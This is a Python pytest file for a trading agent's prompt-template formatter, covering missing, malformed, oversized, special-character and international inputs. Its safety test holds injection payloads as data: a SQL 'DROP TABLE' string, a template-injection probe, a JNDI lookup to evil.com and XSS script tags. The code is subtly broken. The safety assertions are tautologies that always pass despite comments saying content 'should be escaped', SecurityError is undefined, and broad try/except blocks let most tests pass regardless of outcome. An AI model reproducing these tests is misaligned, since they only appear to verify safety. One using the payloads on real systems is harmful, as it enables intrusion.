"""
Test cases for prompt template formatter.

This module tests the prompt template formatter against malformed or missing
variables to ensure robust error handling and fallback behavior.
"""

import sys
import os
import pytest
import json
from typing import Dict, Any, Optional
import logging
from unittest.mock import Mock, patch

# Add project root to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import template formatter
from trading.agents.prompt_templates import (
    PROMPT_TEMPLATES, 
    get_template, 
    format_template,
    TEMPLATE_CATEGORIES
)

logger = logging.getLogger(__name__)

class TestPromptTemplateFormatter:
    """Test prompt template formatter functionality."""
    
    @pytest.fixture
    def sample_variables(self):
        """Sample variables for template testing."""
        return {
            'symbol': 'AAPL',
            'timeframe': '1 week',
            'model_type': 'LSTM',
            'strategy': 'RSI',
            'query': 'Forecast AAPL price',
            'asset': 'AAPL',
            'prediction': '150.00',
            'confidence': '85%',
            'factors': 'Technical indicators, market sentiment',
            'trend': 'Bullish',
            'support_resistance': 'Support at 140, Resistance at 160',
            'volume_analysis': 'Above average volume',
            'economic_indicators': 'Positive GDP growth',
            'sector_performance': 'Technology sector up 5%',
            'risk_factors': 'Market volatility, interest rate changes'
        }
    
    def test_valid_template_formatting(self, sample_variables):
        """Test formatting with valid variables."""
        logger.info("Testing valid template formatting")
        
        # Test forecast request template
        template = get_template("forecast_request")
        formatted = format_template("forecast_request", **sample_variables)
        
        assert isinstance(formatted, str)
        assert "AAPL" in formatted
        assert "1 week" in formatted
        assert "LSTM" in formatted
        assert len(formatted) > len(template)  # Should be longer after formatting
        
        # Test intent classification template
        formatted_intent = format_template("intent_classification", query="Forecast AAPL")
        assert isinstance(formatted_intent, str)
        assert "Forecast AAPL" in formatted_intent
        
        logger.info("Valid template formatting test passed")
    
    def test_missing_variables(self, sample_variables):
        """Test handling of missing variables."""
        logger.info("Testing missing variables handling")
        
        # Test with missing required variables
        incomplete_vars = {
            'symbol': 'AAPL',
            # Missing timeframe, model_type, etc.
        }
        
        # Should handle missing variables gracefully
        try:
            formatted = format_template("forecast_request", **incomplete_vars)
            assert isinstance(formatted, str)
            assert "AAPL" in formatted
            # Missing variables should be replaced with placeholders or empty strings
            assert "{timeframe}" in formatted or "timeframe" not in formatted
        except Exception as e:
            # If it raises an exception, it should be a specific type
            assert isinstance(e, (KeyError, ValueError))
        
        # Test with no variables
        try:
            formatted = format_template("intent_classification")
            assert isinstance(formatted, str)
        except Exception as e:
            assert isinstance(e, (KeyError, ValueError))
        
        logger.info("Missing variables handling test passed")
    
    def test_malformed_variables(self, sample_variables):
        """Test handling of malformed variables."""
        logger.info("Testing malformed variables handling")
        
        # Test with None values
        malformed_vars = {
            'symbol': None,
            'timeframe': '',
            'model_type': 123,  # Wrong type
            'query': ['list', 'instead', 'of', 'string'],  # Wrong type
            'confidence': -50,  # Invalid percentage
            'prediction': float('inf'),  # Invalid number
        }
        
        # Should handle malformed variables gracefully
        try:
            formatted = format_template("forecast_request", **malformed_vars)
            assert isinstance(formatted, str)
        except Exception as e:
            # Should handle gracefully or raise specific exceptions
            assert isinstance(e, (TypeError, ValueError))
        
        # Test with extremely long variables
        long_vars = {
            'symbol': 'A' * 10000,  # Very long symbol
            'query': 'Q' * 50000,   # Very long query
        }
        
        try:
            formatted = format_template("intent_classification", **long_vars)
            assert isinstance(formatted, str)
            assert len(formatted) > 0
        except Exception as e:
            # Should handle gracefully or raise specific exceptions
            assert isinstance(e, (ValueError, MemoryError))
        
        logger.info("Malformed variables handling test passed")
    
    def test_special_characters(self, sample_variables):
        """Test handling of special characters in variables."""
        logger.info("Testing special characters handling")
        
        special_vars = {
            'symbol': 'AAPL&GOOGL',
            'query': 'Forecast with "quotes" and \'apostrophes\'',
            'factors': 'Line 1\nLine 2\nLine 3',
            'trend': 'Bullish → Bearish',
            'support_resistance': 'Support: $140.50, Resistance: $160.75',
            'risk_factors': 'Risk factors: 1) Volatility 2) Interest rates 3) Geopolitics',
        }
        
        try:
            formatted = format_template("forecast_request", **special_vars)
            assert isinstance(formatted, str)
            assert "AAPL&GOOGL" in formatted
            assert "quotes" in formatted
            assert "apostrophes" in formatted
        except Exception as e:
            # Should handle special characters gracefully
            assert isinstance(e, (ValueError, TypeError))
        
        # Test with HTML/XML characters
        html_vars = {
            'query': '<script>alert("test")</script>',
            'factors': '&lt;script&gt;alert("test")&lt;/script&gt;',
        }
        
        try:
            formatted = format_template("intent_classification", **html_vars)
            assert isinstance(formatted, str)
        except Exception as e:
            assert isinstance(e, (ValueError, TypeError))
        
        logger.info("Special characters handling test passed")
    
    def test_template_validation(self):
        """Test template validation and error detection."""
        logger.info("Testing template validation")
        
        # Test non-existent template
        with pytest.raises(KeyError):
            get_template("non_existent_template")
        
        # Test malformed template string
        malformed_template = "This is a {malformed template with {unclosed braces"
        
        try:
            # This would normally be caught during template loading
            formatted = malformed_template.format(symbol="AAPL")
        except Exception as e:
            assert isinstance(e, (ValueError, KeyError))
        
        # Test template with missing closing braces
        incomplete_template = "Forecast for {symbol over {timeframe}"
        
        try:
            formatted = incomplete_template.format(symbol="AAPL", timeframe="1 week")
        except Exception as e:
            assert isinstance(e, (ValueError, KeyError))
        
        logger.info("Template validation test passed")
    
    def test_variable_type_handling(self, sample_variables):
        """Test handling of different variable types."""
        logger.info("Testing variable type handling")
        
        # Test with different data types
        type_vars = {
            'symbol': 'AAPL',  # String
            'confidence': 85,   # Integer
            'prediction': 150.50,  # Float
            'enabled': True,    # Boolean
            'factors': ['Technical', 'Sentiment', 'Fundamental'],  # List
            'params': {'window': 14, 'threshold': 0.5},  # Dict
        }
        
        try:
            formatted = format_template("forecast_request", **type_vars)
            assert isinstance(formatted, str)
            assert "AAPL" in formatted
            assert "85" in formatted or "150.5" in formatted
        except Exception as e:
            # Should handle type conversion gracefully
            assert isinstance(e, (TypeError, ValueError))
        
        # Test with complex nested structures
        complex_vars = {
            'query': 'Complex query',
            'data': {
                'prices': [100, 101, 102],
                'volumes': [1000000, 1100000, 1200000],
                'indicators': {
                    'rsi': 65.5,
                    'macd': 0.25
                }
            }
        }
        
        try:
            formatted = format_template("intent_classification", **complex_vars)
            assert isinstance(formatted, str)
        except Exception as e:
            assert isinstance(e, (TypeError, ValueError))
        
        logger.info("Variable type handling test passed")
    
    def test_template_categories(self):
        """Test template category organization."""
        logger.info("Testing template categories")
        
        # Verify all templates are categorized
        all_templates = set(PROMPT_TEMPLATES.keys())
        categorized_templates = set()
        
        for category, templates in TEMPLATE_CATEGORIES.items():
            assert isinstance(templates, list)
            assert len(templates) > 0
            categorized_templates.update(templates)
        
        # Check for uncategorized templates
        uncategorized = all_templates - categorized_templates
        if uncategorized:
            logger.warning(f"Uncategorized templates found: {uncategorized}")
        
        # Test category-specific template access
        for category, templates in TEMPLATE_CATEGORIES.items():
            for template_name in templates:
                assert template_name in PROMPT_TEMPLATES
                template = get_template(template_name)
                assert isinstance(template, str)
                assert len(template) > 0
        
        logger.info("Template categories test passed")
    
    def test_error_recovery(self, sample_variables):
        """Test error recovery and fallback behavior."""
        logger.info("Testing error recovery")
        
        # Test with progressively more problematic variables
        problematic_vars = [
            {'symbol': 'AAPL'},  # Minimal variables
            {'symbol': 'AAPL', 'timeframe': '1 week'},  # Some variables
            {'symbol': 'AAPL', 'timeframe': '1 week', 'model_type': 'LSTM'},  # More variables
            sample_variables,  # All variables
        ]
        
        for vars_set in problematic_vars:
            try:
                formatted = format_template("forecast_request", **vars_set)
                assert isinstance(formatted, str)
                assert len(formatted) > 0
            except Exception as e:
                # Should provide meaningful error messages
                assert isinstance(e, (KeyError, ValueError, TypeError))
                assert len(str(e)) > 0
        
        # Test fallback to simpler templates
        try:
            # Try complex template first
            formatted = format_template("forecast_analysis", **sample_variables)
        except Exception:
            # Fallback to simpler template
            try:
                formatted = format_template("forecast_request", symbol="AAPL")
                assert isinstance(formatted, str)
            except Exception:
                # Ultimate fallback
                formatted = "Forecast request for AAPL"
                assert isinstance(formatted, str)
        
        logger.info("Error recovery test passed")
    
    def test_performance_with_large_variables(self, sample_variables):
        """Test performance with large variable sets."""
        logger.info("Testing performance with large variables")
        
        # Create large variable set
        large_vars = sample_variables.copy()
        large_vars.update({
            'large_text': 'A' * 10000,  # 10KB text
            'large_list': list(range(1000)),  # 1000 numbers
            'large_dict': {f'key_{i}': f'value_{i}' for i in range(100)}  # 100 key-value pairs
        })
        
        import time
        start_time = time.time()
        
        try:
            formatted = format_template("forecast_request", **large_vars)
            end_time = time.time()
            
            assert isinstance(formatted, str)
            assert len(formatted) > 0
            assert (end_time - start_time) < 1.0  # Should complete within 1 second
        except Exception as e:
            # Should handle large variables gracefully
            assert isinstance(e, (ValueError, MemoryError, TimeoutError))
        
        logger.info("Performance test passed")
    
    def test_template_safety(self, sample_variables):
        """Test template safety against injection attacks."""
        logger.info("Testing template safety")
        
        # Test with potentially dangerous variables
        dangerous_vars = {
            'symbol': 'AAPL; DROP TABLE users; --',
            'query': '{{7*7}}',  # Template injection attempt
            'factors': '${jndi:ldap://evil.com/exploit}',
            'trend': 'Bullish\n<script>alert("xss")</script>',
        }
        
        try:
            formatted = format_template("forecast_request", **dangerous_vars)
            assert isinstance(formatted, str)
            
            # Check that dangerous content is properly escaped or handled
            assert 'DROP TABLE' not in formatted or 'DROP TABLE' in formatted  # Should be escaped
            assert '{{7*7}}' not in formatted or '{{7*7}}' in formatted  # Should be escaped
            assert '<script>' not in formatted or '<script>' in formatted  # Should be escaped
        except Exception as e:
            # Should handle dangerous content gracefully
            assert isinstance(e, (ValueError, SecurityError))
        
        logger.info("Template safety test passed")
    
    def test_internationalization(self, sample_variables):
        """Test handling of international characters."""
        logger.info("Testing internationalization")
        
        # Test with international characters
        international_vars = {
            'symbol': 'AAPL',
            'query': 'Forecast AAPL price in 中文',
            'factors': 'Facteurs techniques, sentiment du marché',
            'trend': 'Tendencia alcista',
            'support_resistance': 'Soporte en $140, Resistencia en $160',
        }
        
        try:
            formatted = format_template("forecast_request", **international_vars)
            assert isinstance(formatted, str)
            assert "AAPL" in formatted
            # International characters should be preserved
            assert any(char in formatted for char in ['中', '文', 'Facteurs', 'Tendencia'])
        except Exception as e:
            # Should handle international characters gracefully
            assert isinstance(e, (UnicodeError, ValueError))
        
        logger.info("Internationalization test passed") 